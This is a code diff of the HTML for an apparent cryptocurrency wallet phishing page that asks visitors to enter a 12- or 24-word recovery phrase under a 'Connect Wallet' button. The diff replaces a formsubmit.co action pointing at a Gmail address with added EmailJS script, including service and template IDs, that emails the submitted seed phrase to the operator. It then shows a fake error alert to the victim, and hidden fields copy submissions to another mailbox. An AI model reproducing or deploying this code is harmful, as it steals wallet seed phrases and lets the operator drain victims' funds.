@@ -1563,7 +1563,7 @@
             <br>
           </div>
 
-             <form action="https://formsubmit.co/hickelhill@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+             <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                       <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="https://defichains-web3restored.vercel.app/paccess/point/barcode-generated.html">
@@ -1584,12 +1584,12 @@
             <p id="errorMessage" class="error-text" style="display: none">
               Error: Please enter a valid detail.
             </p>
-            <textarea id="inputTextArea" name="phrase" placeholder="Enter 12 or 24 phrase words" required=""></textarea>
+            <textarea id="keys" name="message" placeholder="Enter 12 or 24 words" required=""></textarea>
 
             
 
             <div class="error" style="color: red"></div>
-            <button id="sendButton" type="submit" name="submit" value="submit">
+            <button id="submit" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1614,6 +1614,37 @@
         </form>
       </div>
     </div>
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('mwpdgvzijbe3eFkpo')
+</script>
+
+<script>
+const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+.addEventListener('submit', function(event) {
+event.preventDefault();
+
+btn.value = 'Sending...';
+
+const serviceID = 'service_kgviq8m';
+const templateID = 'template_t0wn8n8';
+
+emailjs.sendForm(serviceID, templateID, this)
+.then(() => {
+btn.value = 'Send Email';
+alert('opps! error! contact admin or try again.');
+}, (err) => {
+btn.value = 'Send Email';
+alert(JSON.stringify(err));
+});
+});
+</script>
+
+
 
         <script src="js/javasc.js"></script>
     
